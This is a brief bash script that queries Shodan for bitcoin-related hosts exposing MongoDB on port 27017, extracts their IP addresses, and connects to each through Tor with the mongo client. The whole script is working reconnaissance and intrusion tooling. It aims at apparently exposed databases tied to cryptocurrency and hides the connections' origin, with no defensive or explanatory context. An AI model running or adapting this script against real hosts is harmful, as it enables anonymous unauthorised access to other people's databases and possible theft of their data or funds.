#!/bin/bash
# author Dario Clavijo 2017

shodan search bitcoin | grep -e 27017 > /tmp/bitcoin_mongo
cat /tmp/bitcoin_mongo | awk '{ print $1 }' > /tmp/bitcoin_mongo_ips

for j in `cat /tmp/bitcoin_mongo_ips`
do
	torify mongo $j
done
